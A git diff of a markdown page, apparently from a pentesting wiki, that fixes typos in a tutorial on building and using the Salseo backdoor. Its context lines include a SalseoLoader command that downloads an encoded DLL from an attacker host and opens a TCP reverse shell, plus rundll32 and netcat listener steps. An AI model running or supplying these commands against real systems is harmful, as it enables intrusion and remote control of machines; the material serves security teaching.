@@ -25,7 +25,7 @@ Compile those projects for the architecture of the windows box where your are go
 
 You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
 
-**(**If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+(**If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
 
 ![](../.gitbook/assets/image.png)
 
@@ -35,7 +35,7 @@ Then, build both projects (Build -> Build Solution) (Inside the logs will appear
 
 # Prepare the Backdoor
 
-First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**
+First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:
 
 ## **Python**
 
@@ -59,7 +59,7 @@ Ok, now you have everything you need to execute all the Salseo thing: the **enco
 
 ## **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
 
-Remember to start a nc as the reverse shell listener, and a HTTP server to serve the encoded evilsalsa.
+Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.
 
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
@@ -162,9 +162,9 @@ Execute:
 rundll32.exe SalseoLoader.dll,main
 ```
 
-If not error appears, probably you have a functional dll!!
+If no error appears, probably you have a functional DLL!!
 
-# Get a shell using the Dll
+# Get a shell using the DLL
 
 Don't forget to use a **HTTP** **server** and set a **nc** **listener**
 
